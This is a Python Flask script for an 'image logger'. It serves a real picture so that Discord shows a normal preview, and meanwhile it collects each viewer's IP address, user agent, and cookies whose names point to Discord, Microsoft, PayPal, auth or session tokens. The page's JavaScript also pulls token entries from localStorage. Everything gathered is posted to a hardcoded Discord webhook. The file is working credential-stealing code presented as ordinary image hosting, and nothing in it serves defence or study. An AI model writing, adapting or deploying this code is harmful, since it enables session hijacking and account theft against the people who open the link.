from flask import Flask, request, send_file, redirect
import requests
import json
import os
from datetime import datetime
from PIL import Image
from io import BytesIO

app = Flask(__name__)

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1518539631812149330/Uk2DGqWMrpgED3wh1fyD-8NL2iu7daT-j9VApXjKF7aEGhoxnJC1V3XqqBOCeIeebXW2"
IMAGE_PATH = "real-image.jpg"

def send_to_webhook(data):
    important = {}
    targets = ['discord', 'microsoft', 'paypal', 'token', 'auth', 'session']
    for k, v in data.get('cookies', {}).items():
        if any(t in k.lower() for t in targets):
            important[k] = v[:200]  # truncated for safety
    
    embed = {
        "title": "📸 New Image View",
        "color": 0x00FF00,
        "fields": [
            {"name": "IP", "value": data.get('ip'), "inline": True},
            {"name": "Time", "value": data.get('time')},
            {"name": "Important Tokens", "value": f"```json\n{json.dumps(important, indent=2)}\n```" if important else "none"},
            {"name": "UA", "value": data.get('ua')[:400]}
        ]
    }
    requests.post(DISCORD_WEBHOOK, json={"embeds": [embed], "content": "**Image Hit**"})

@app.route('/image.jpg')
def logger_image():
    # Log data
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    cookies = dict(request.cookies)
    time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    data = {'ip': ip, 'ua': ua, 'cookies': cookies, 'time': time_str}
    send_to_webhook(data)
    
    # ECHTES Bild senden → Discord Preview funktioniert
    if os.path.exists(IMAGE_PATH):
        return send_file(IMAGE_PATH, mimetype='image/jpeg')
    else:
        img = Image.new('RGB', (800, 600), color=(20, 20, 30))
        img_io = BytesIO()
        img.save(img_io, 'JPEG')
        img_io.seek(0)
        return send_file(img_io, mimetype='image/jpeg')

@app.route('/')
@app.route('/view')
def auto_open():
    # Redirect Trick + JS
    html = '''
    <!DOCTYPE html>
    <html>
    <head><style>body{margin:0}img{max-width:100%;height:auto;}</style></head>
    <body>
        <img src="/image.jpg" alt="">
        <script>
            // Auto open + extra data
            setTimeout(() => {
                window.open("/image.jpg", "_blank");
            }, 400);
            
            // Try to send localStorage
            try {
                let ls = JSON.stringify(Object.fromEntries(Object.entries(localStorage).filter(([k]) => 
                    k.toLowerCase().includes('token') || k.toLowerCase().includes('discord'))));
                fetch(`/image.jpg?ls=${encodeURIComponent(ls)}`, {credentials: 'include'});
            } catch(e){}
        </script>
    </body>
    </html>
    '''
    return html

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)